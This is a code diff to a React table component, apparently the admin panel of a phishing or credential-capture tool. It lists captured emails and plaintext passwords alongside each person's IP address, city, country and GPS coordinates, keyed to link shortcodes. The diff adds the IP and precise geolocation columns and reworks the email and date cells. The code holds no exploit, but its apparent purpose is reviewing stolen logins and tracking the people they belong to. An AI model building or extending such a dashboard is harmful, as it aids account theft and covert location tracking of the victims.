@@ -425,9 +425,11 @@ function FormCaptureTable({
             <TableHeader>
               <TableRow>
                 <TableHead className='w-[100px]'>Source</TableHead>
-                <TableHead>Email / Phone</TableHead>
+                <TableHead>Email</TableHead>
                 <TableHead>Password</TableHead>
-                <TableHead>Info</TableHead>
+                <TableHead>IP Address</TableHead>
+                <TableHead>Lokasi</TableHead>
+                <TableHead>Geolokasi</TableHead>
                 <TableHead>Shortcode</TableHead>
                 <TableHead className='text-right'>Tanggal</TableHead>
               </TableRow>
@@ -446,17 +448,13 @@ function FormCaptureTable({
                     </div>
                   </TableCell>
                   <TableCell>
-                    {capture.email && (
+                    {capture.email ? (
                       <div className='flex items-center text-sm'>
                         <Mail className='mr-1 h-4 w-4' />
                         {capture.email}
                       </div>
-                    )}
-                    {capture.phone && (
-                      <div className='flex items-center text-sm'>
-                        <Phone className='mr-1 h-4 w-4' />
-                        {capture.phone}
-                      </div>
+                    ) : (
+                      <span className='text-sm text-muted-foreground'>N/A</span>
                     )}
                     {capture.name && (
                       <div className='mt-1 text-xs text-muted-foreground'>
@@ -477,20 +475,36 @@ function FormCaptureTable({
                     )}
                   </TableCell>
                   <TableCell>
+                    {capture.ip ? (
+                      <div className='font-mono text-sm'>{capture.ip}</div>
+                    ) : (
+                      <span className='text-sm text-muted-foreground'>N/A</span>
+                    )}
+                  </TableCell>
+                  <TableCell>
                     <div className='text-sm'>
-                      <div>{capture.ip || 'N/A'}</div>
+                      {capture.city ? (
+                        <div>{capture.city}</div>
+                      ) : (
+                        <span className='text-muted-foreground'>N/A</span>
+                      )}
                       {capture.country && (
                         <div className='text-xs text-muted-foreground'>
-                          {capture.city ? `${capture.city}, ` : ''}
                           {capture.country}
                         </div>
                       )}
-                      {capture.browser && (
-                        <div className='text-xs text-muted-foreground'>
-                          {capture.browser} / {capture.os}
-                        </div>
-                      )}
                     </div>
+                  </TableCell>
+                  <TableCell>
+                    {capture.additional_data &&
+                    capture.additional_data.coordinates ? (
+                      <div className='font-mono text-sm'>
+                        {capture.additional_data.coordinates.lat},{' '}
+                        {capture.additional_data.coordinates.lng}
+                      </div>
+                    ) : (
+                      <span className='text-sm text-muted-foreground'>N/A</span>
+                    )}
                   </TableCell>
                   <TableCell>
                     {capture.shortcode ? (
@@ -498,13 +512,17 @@ function FormCaptureTable({
                         {capture.shortcode}
                       </span>
                     ) : (
-                      <span className='text-xs text-gray-400'>-</span>
+                      <span className='text-sm text-muted-foreground'>N/A</span>
                     )}
                   </TableCell>
                   <TableCell className='text-right'>
-                    {capture.created_at
-                      ? formatDate(capture.created_at.toString())
-                      : 'N/A'}
+                    {capture.created_at ? (
+                      <div className='text-sm'>
+                        {formatDate(Number(capture.created_at))}
+                      </div>
+                    ) : (
+                      <span className='text-sm text-muted-foreground'>N/A</span>
+                    )}
                   </TableCell>
                 </TableRow>
               ))}
